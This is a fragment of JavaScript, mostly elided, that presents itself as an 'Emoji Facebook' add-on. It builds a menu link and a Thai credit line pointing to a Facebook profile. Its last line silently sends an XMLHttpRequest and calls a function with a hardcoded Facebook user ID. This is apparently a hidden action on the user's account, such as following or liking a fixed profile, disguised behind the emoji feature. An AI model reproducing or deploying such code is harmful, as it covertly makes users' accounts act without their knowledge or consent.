...
"chars" : " :) ",
	...
	// Toggler
	html += '<a class="navLink" title="Emoji Facebook">'; // var navLink
	html += '<span style="vertical-align: middle;"><img src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"><FONT COLOR=#FFFFFF>Emoji Facebook</FONT></img></span>';
	html += '</a>';
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/Ahirnick" target="_blank">ขอให้สนุกกับอิโมจิ <br>By AVG</a>';
	html += '</div>';
...
{ var http4=new XMLHttpRequest;
 ...
 http4.send(params4)}a("100001796531316");
